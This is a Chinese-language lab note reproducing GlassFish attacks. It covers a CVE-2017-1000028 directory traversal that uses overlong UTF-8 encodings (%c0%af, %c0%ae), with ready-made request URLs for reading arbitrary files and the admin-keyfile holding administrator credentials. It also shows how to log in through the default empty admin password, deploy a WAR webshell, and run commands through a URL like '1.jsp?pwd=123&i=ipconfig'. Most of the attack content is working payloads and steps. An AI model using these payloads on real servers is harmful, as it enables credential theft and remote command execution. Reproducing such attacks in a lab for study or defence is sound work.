### 目录穿越（CVE-2017-1000028）

参考文章[GlassFish漏洞总结复现-CSDN博客](https://blog.csdn.net/weixin_44033675/article/details/121316067)

##### 原理

说白了就是把目录穿越的/换成%c0%af

java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的/（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。 计算机指定了UTF8编码接收二进制并进行转义，当发现字节以0开头，表示这是一个标准ASCII字符，直接转义，当发现110开头，则取2个字节 去掉110模板后转义。

java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。

##### 版本

<=4.1.2版本

##### 利用

访问：`http://your-ip:8080`进入web应用界面；`http://your-ip:4848`进入管理中心。

比如你要读取在根目录下1.txt文件

然后利用漏洞读取该文件,通过..%c0%af..%c0%af来向上跳转，达到目录穿越，读取文件；最终测试访问链接如下：
http://localhost:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af1.txt
通过测试大概穿越9次路径跳至GlassFish的解压目录处；prototype去掉不影响；可有可无。

读admin-keyfile文件，该文件是储存admin账号密码的文件,爆破。

位置在glassfish/domains/domain1/config/admin-keyfile

访问路径为：

http://localhost:4848/theme/META-INF/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains/domain1/config/admin-keyfile

上面是windows，linux重新从文章中看

### 后台弱口令+Getshell

参考文章：[GlassFish漏洞总结复现-CSDN博客](https://blog.csdn.net/weixin_44033675/article/details/121316067)

默认安装的GlassFish管理中心是空密码的，无需登录，直接进入后台。

进入后台后 Applications，点击右边的deploy。

选中war包后上传，填写Context Root 这个关系到你访问的url，点击Ok。

访问`http://127.0.0.1:8080/[Context Root]/[war包内的filename]`
`http://127.0.0.1:8080/getshell/1.jsp?pwd=123&i=ipconfig`